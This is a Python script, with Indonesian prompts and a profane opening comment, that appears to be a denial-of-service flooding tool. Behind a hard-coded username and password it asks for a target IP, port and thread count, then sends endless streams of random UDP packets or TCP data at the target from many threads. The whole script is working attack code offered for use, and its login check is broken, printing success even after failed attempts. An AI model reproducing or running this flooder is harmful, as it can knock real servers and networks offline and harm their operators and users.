#MEMEK ANJING KONTOL
import random
import socket
import threading
import sys
import os
import signal
import time
from os import system, name

#Login

user ="KILLER"

for i in range(3):
	pwd = input("\033[93m> Masukan User : ")
	j=3
	if(pwd==user):
		time.sleep(5)
		break
	else:
		time.sleep(5)
		print("\033[91m> User Salah")
		continue
time.sleep(5)
print("\033[94m> User Benar")

password ="MENGONT"

for i in range(3):
	pwd = input("\033[93m> Masukan Password : ")
	j=3
	if(pwd==password):
		time.sleep(5)
		print("\033[92mTunggu...")
		break
	else:
		time.sleep(5)
		print("\033[91m> Password Salah")
		continue
time.sleep(5)
print("\033[94m> Password Benar")

# Script

print(" VIP ")
ip = str(input("\033[2;32m> Enter the target ip \xBB \033[0m"))
port = int(input("\033[2;32m> Enter the target port \xBB \033[0m"))
choice = str(input("\033[2;32m> Enter the Method \xBB \033[0m"))
times = int(input("\033[2;32m> Enter the  bytes \xBB \033[0m"))
threads = int(input("\033[2;32m> Enter how many threads to use \xBB \033[0m"))
def run():
	data = random._urandom(1024)
	i = random.choice(("","",""))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[1;34m[THREAD %s] \033[0m\xBB \033[1;35m%s\033[0m bytes sent to \033[1;35m%s\033[0m"%(threads,times,ip))
		except: 
			print("[!] Error!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("","",""))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[1;34m[THREAD %s] \033[0m\xBB \033[1;35m%s\033[0m bytes sent to \033[1;35m%s\033[0m"%(threads,times,ip))
		except:
			s.close()
			print("[*] Error")

for udp in range(threads):
	if choice == 'udp':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()

def whereuwere():
    print("Pilih Method")
    whereman = str(input("Udp/Tcp:"))
    if whereman == 'udp':
        run()
    else:
        run2()

def clear():
	#Script Windows
    if name == 'nt':
        _ = system('cls')

    #Script Mac, Linux
    else:
        _ = system('clear')

def byebye():
	clear()
	os.system("figlet Anda Meninggalkan Tuan -f miring")
	sys.exit(130)

def exit_gracefully(signum, frame):
    signal.signal(signal.SIGINT, original_sigint)

    try:
        exitc = str(input("Exit? : "))
        if exitc == 'y':

            byebye()

    except KeyboardInterrupt:
        print("Okay")
        byebye()

    signal.signal(signal.SIGINT, exit_gracefully)
